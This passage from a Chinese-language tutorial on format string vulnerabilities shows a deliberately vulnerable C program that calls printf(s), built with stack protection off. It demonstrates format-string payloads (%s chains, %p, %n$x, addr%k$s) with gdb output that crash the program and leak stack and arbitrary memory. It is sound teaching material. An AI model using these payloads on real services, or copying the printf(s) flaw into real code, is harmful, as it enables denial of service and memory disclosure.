<li>解析其内容对应的整形值</li>
<li>解析其内容对应的浮点值</li>
</ol>
<p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p>
<p>这基本就是格式化字符串漏洞的基本原理了。</p>
<h2 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</a></li>
</ul>
<h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p>
<ul>
<li>使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。</li>
<li>查看进程内容，根据 %d，%f 输出了栈上的内容。</li>
</ul>
<p>下面我们会对于每一方面进行更加详细的解释。</p>
<h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure>

<p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p>
<h2 id="泄漏内存"><a href="#泄漏内存" class="headerlink" title="泄漏内存"></a>泄漏内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
<ul>
<li>泄露栈内存<ul>
<li>获取某个变量的值</li>
<li>获取某个变量对应地址的内存</li>
</ul>
</li>
<li>泄露任意地址内存<ul>
<li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li>
<li>盲打，dump 整个程序，获取有用信息。</li>
</ul>
</li>
</ul>
<p>泄漏栈内存</p>
<p>例如，给定如下程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  char s[100];</span><br><span class="line">  int a &#x3D; 1, b &#x3D; 0x22222222, c &#x3D; -1;</span><br><span class="line">  scanf(&quot;%s&quot;, s);</span><br><span class="line">  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);</span><br><span class="line">  printf(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，我们简单编译一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</span><br><span class="line">leakmemory.c: In function ‘main’:</span><br><span class="line">leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   printf(s);</span><br><span class="line">          ^</span><br></pre></td></tr></table></figure>

<p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。</p>
<p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p>
<h3 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h3><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">%08x.%08x.%08x</span><br><span class="line">00000001.22222222.ffffffff.%08x.%08x.%08x</span><br><span class="line">ffad3cf0.000000c2.f7e639db</span><br></pre></td></tr></table></figure>

<p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p>
<p>首先，启动程序，将断点下载 printf 函数处</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb leakmemory</span><br><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048330</span><br></pre></td></tr></table></figure>

<p>之后，运行程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br></pre></td></tr></table></figure>

<p>此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-------------------------------]</span><br><span class="line">EAX: 0xffffce60 (&quot;%08x.%08x.%08x&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x1 </span><br><span class="line">EDX: 0xf7fb687c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0 </span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0 </span><br><span class="line">EBP: 0xffffced8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffce3c --&gt; 0x80484bf (&lt;main+84&gt;:	add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:	call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code---------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:	ret    </span><br><span class="line">   0xf7e4e02c:	xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:	xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:	call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:	add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack---------------------------------]</span><br><span class="line">0000| 0xffffce3c --&gt; 0x80484bf (&lt;main+84&gt;:	add    esp,0x20)</span><br><span class="line">0004| 0xffffce40 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\n&quot;)</span><br><span class="line">0008| 0xffffce44 --&gt; 0x1 </span><br><span class="line">0012| 0xffffce48 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377&#96;\316\377\377&#96;\316\377\377&quot;, &lt;incomplete sequence \302&gt;)</span><br><span class="line">0016| 0xffffce4c --&gt; 0xffffffff </span><br><span class="line">0020| 0xffffce50 --&gt; 0xffffce60 (&quot;%08x.%08x.%08x&quot;)</span><br><span class="line">0024| 0xffffce54 --&gt; 0xffffce60 (&quot;%08x.%08x.%08x&quot;)</span><br><span class="line">0028| 0xffffce58 --&gt; 0xc2 </span><br><span class="line">[--------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure>

<p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%08x.%08x.%08x</span><br></pre></td></tr></table></figure>

<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, __printf (format&#x3D;0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28</span><br><span class="line">28  in printf.c</span><br><span class="line">───────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]</span><br><span class="line">   0xf7e4466d                  nop</span><br><span class="line">   0xf7e4466e                  xchg   ax, ax</span><br><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffccfc&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;</span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;   ← $eax</span><br><span class="line">0xffffcd14│+0x18: &quot;.%08x.%08x&quot;</span><br><span class="line">0xffffcd18│+0x1c: &quot;x.%08x&quot;</span><br></pre></td></tr></table></figure>

<p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">ffffce60.000000c2.f7e949db[Inferior 1 (process 13081) exited normally]</span><br></pre></td></tr></table></figure>

<p>当然，我们也可以使用 %p 来获取数据，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%p.%p.%p</span><br><span class="line">00000001.22222222.ffffffff.%p.%p.%p</span><br><span class="line">0xff9cb970.0xc2.0xf7e6b9db</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
<p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢</strong>？肯定是可以的啦。方法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure>

<p>利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p>
<p>这里我们再次以 gdb 调试一下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb leakmemory</span><br><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048330</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">%3$x</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7fb687c --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:	add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:	call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:	ret</span><br><span class="line">   0xf7e4e02c:	xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:	xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:	call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:	add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:	add    esp,0x20)</span><br><span class="line">0004| 0xffffd420 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\n&quot;)</span><br><span class="line">0008| 0xffffd424 --&gt; 0x1</span><br><span class="line">0012| 0xffffd428 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377@\324\377\377@\324\377\377&quot;, &lt;incomplete sequence \302&gt;)</span><br><span class="line">0016| 0xffffd42c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd430 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0024| 0xffffd434 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0028| 0xffffd438 --&gt; 0xc2</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%3$x</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x7fffffe0</span><br><span class="line">EDX: 0xf7fb6870 --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:	add    esp,0x10)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:	call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:	ret</span><br><span class="line">   0xf7e4e02c:	xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:	xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:	call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:	add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:	add    esp,0x10)</span><br><span class="line">0004| 0xffffd430 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0008| 0xffffd434 --&gt; 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0012| 0xffffd438 --&gt; 0xc2</span><br><span class="line">0016| 0xffffd43c --&gt; 0xf7e949db (add    esp,0x10)</span><br><span class="line">0020| 0xffffd440 (&quot;%3$x&quot;)</span><br><span class="line">0024| 0xffffd444 --&gt; 0xffffd500 --&gt; 0x0</span><br><span class="line">0028| 0xffffd448 --&gt; 0xe0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">f7e949db[Inferior 1 (process 13810) exited normally]</span><br></pre></td></tr></table></figure>

<p>可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e949db。</p>
<h3 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h3><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048330</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: &#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;leakmemory</span><br><span class="line">%s</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 --&gt; 0xff007325</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7fb687c --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:	add    esp,0x20)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:	call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:	ret</span><br><span class="line">   0xf7e4e02c:	xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:	xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:	call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:	add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;:	add    esp,0x20)</span><br><span class="line">0004| 0xffffd420 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\n&quot;)</span><br><span class="line">0008| 0xffffd424 --&gt; 0x1</span><br><span class="line">0012| 0xffffd428 (&quot;\&quot;\&quot;\&quot;\&quot;\377\377\377\377@\324\377\377@\324\377\377&quot;, &lt;incomplete sequence \302&gt;)</span><br><span class="line">0016| 0xffffd42c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd430 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0024| 0xffffd434 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0028| 0xffffd438 --&gt; 0xc2</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%s</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd440 --&gt; 0xff007325</span><br><span class="line">EBX: 0x0</span><br><span class="line">ECX: 0x7fffffe2</span><br><span class="line">EDX: 0xf7fb6870 --&gt; 0x0</span><br><span class="line">ESI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EDI: 0xf7fb5000 --&gt; 0x1afdb0</span><br><span class="line">EBP: 0xffffd4b8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:	add    esp,0x10)</span><br><span class="line">EIP: 0xf7e4e030 (&lt;printf&gt;:	call   0xf7f22369)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e4e02b &lt;fprintf+27&gt;:	ret</span><br><span class="line">   0xf7e4e02c:	xchg   ax,ax</span><br><span class="line">   0xf7e4e02e:	xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e4e030 &lt;printf&gt;:	call   0xf7f22369</span><br><span class="line">   0xf7e4e035 &lt;printf+5&gt;:	add    eax,0x166fcb</span><br><span class="line">   0xf7e4e03a &lt;printf+10&gt;:	sub    esp,0xc</span><br><span class="line">   0xf7e4e03d &lt;printf+13&gt;:	mov    eax,DWORD PTR [eax-0x68]</span><br><span class="line">   0xf7e4e043 &lt;printf+19&gt;:	lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;:	add    esp,0x10)</span><br><span class="line">0004| 0xffffd430 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0008| 0xffffd434 --&gt; 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0012| 0xffffd438 --&gt; 0xc2</span><br><span class="line">0016| 0xffffd43c --&gt; 0xf7e949db (add    esp,0x10)</span><br><span class="line">0020| 0xffffd440 --&gt; 0xff007325</span><br><span class="line">0024| 0xffffd444 --&gt; 0xffffd56c --&gt; 0xffffd6f2 (&quot;LC_TERMINAL_VERSION&#x3D;3.4.3&quot;)</span><br><span class="line">0028| 0xffffd448 --&gt; 0xe0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">%s[Inferior 1 (process 13866) exited normally]</span><br></pre></td></tr></table></figure>

<p>可以看出，在第二次执行 printf 函数的时候，确实是将 0xffff440 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
<p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">%2$s</span><br><span class="line">00000001.22222222.ffffffff.%2$s</span><br><span class="line">[1]    13899 segmentation fault (core dumped)  .&#x2F;leakmemory</span><br></pre></td></tr></table></figure>

<h3 id="小技巧总结"><a href="#小技巧总结" class="headerlink" title="小技巧总结"></a>小技巧总结</h3><blockquote>
<ol>
<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容</li>
</ol>
</blockquote>
<h3 id="任意地址泄漏内存"><a href="#任意地址泄漏内存" class="headerlink" title="任意地址泄漏内存"></a>任意地址泄漏内存</h3><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p>
<p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, 0xf7e4e030 in printf () from &#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xffffd440  →  0xff007325 (&quot;%s&quot;?)</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0x7fffffe2</span><br><span class="line">$edx   : 0xf7fb6870  →  0x00000000</span><br><span class="line">$esp   : 0xffffd42c  →  0x080484ce  →  &lt;main+99&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0xffffd4b8  →  0x00000000</span><br><span class="line">$esi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$edi   : 0xf7fb5000  →  0x001afdb0</span><br><span class="line">$eip   : 0xf7e4e030  →  &lt;printf+0&gt; call 0xf7f22369</span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffd42c│+0x0000: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp</span><br><span class="line">0xffffd430│+0x0004: 0xffffd440  →  0xff007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffd434│+0x0008: 0xffffd440  →  0xff007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffd438│+0x000c: 0x000000c2</span><br><span class="line">0xffffd43c│+0x0010: 0xf7e949db  →   add esp, 0x10</span><br><span class="line">0xffffd440│+0x0014: 0xff007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffd444│+0x0018: 0xffffd56c  →  0xffffd6f2  →  &quot;LC_TERMINAL_VERSION&#x3D;3.4.3&quot;</span><br><span class="line">0xffffd448│+0x001c: 0x000000e0</span><br></pre></td></tr></table></figure>

<p>可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffd440，同时该地址存储的也确实是是 “%s” 格式化字符串内容。</p>
<p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p>
</blockquote>
<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure>

<p>一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br><span class="line">00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br><span class="line">AAAA0xff9f83000xc20xf7e799db0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xff9f83c40xf7f9a0000xf377</span><br></pre></td></tr></table></figure>

<p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;leakmemory</span><br><span class="line">%4$s</span><br><span class="line">00000001.22222222.ffffffff.%4$s</span><br><span class="line">[1]    14375 segmentation fault (core dumped)  .&#x2F;leakmemory</span><br></pre></td></tr></table></figure>

